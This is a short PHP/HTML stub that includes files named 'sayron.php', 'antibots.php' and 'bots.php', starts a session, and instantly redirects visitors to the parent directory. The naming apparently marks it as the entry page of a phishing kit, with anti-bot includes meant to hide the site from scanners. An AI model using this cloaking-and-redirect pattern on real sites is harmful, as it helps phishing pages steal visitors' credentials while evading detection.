<?php 
include('sayron.php'); 
?>
<?php


include 'antibots.php';
include 'bots.php';

session_start();

?>
<html><head>
<meta http-equiv="refresh" content="0; URL=../">
<script language="JavaScript" type="text/javascript">
<!--
function redirect() { 
setTimeout("window.location.replace('../')", 0); }
-->
</script>
</head>
